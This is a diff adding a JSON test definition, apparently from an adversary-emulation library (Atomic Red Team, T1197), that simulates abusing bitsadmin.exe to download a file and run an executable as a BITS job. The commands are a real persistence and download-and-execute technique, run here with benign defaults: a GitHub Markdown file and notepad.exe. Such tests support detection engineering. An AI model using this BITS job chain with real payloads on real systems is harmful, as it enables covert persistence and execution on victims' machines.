@@ -1,0 +1,70 @@
+{
+  "id": "62a06ec5-5754-47d2-bcfc-123d8314c6ae",
+  "name": "Persist, Download, \u0026 Execute",
+  "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "1c083c22-9e5b-4feb-b4af-874e10831ecb",
+      "type": "execute-command",
+      "data": {
+        "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 \u003enul 2\u003e\u00261\nbitsadmin.exe /complete #{bits_job_name}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "7ff8a75e-ecd0-4435-b900-26cf05719081",
+      "type": "execute-command",
+      "data": {
+        "command": "del #{local_file} \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "1c083c22-9e5b-4feb-b4af-874e10831ecb",
+      "p": "on-success",
+      "o": "7ff8a75e-ecd0-4435-b900-26cf05719081"
+    },
+    {
+      "s": "1c083c22-9e5b-4feb-b4af-874e10831ecb",
+      "p": "on-failure",
+      "o": "7ff8a75e-ecd0-4435-b900-26cf05719081"
+    }
+  ],
+  "tags": [
+    "T1197",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "local_file",
+      "type": "path",
+      "description": "Local file path to save downloaded file",
+      "value": "%temp%\\bitsadmin3_flag.ps1"
+    },
+    {
+      "name": "remote_file",
+      "type": "url",
+      "description": "Remote file to download",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md"
+    },
+    {
+      "name": "command_path",
+      "type": "path",
+      "description": "Path of command to execute",
+      "value": "C:\\Windows\\system32\\notepad.exe"
+    },
+    {
+      "name": "bits_job_name",
+      "type": "string",
+      "description": "Name of BITS job",
+      "value": "AtomicBITS"
+    }
+  ]
+}
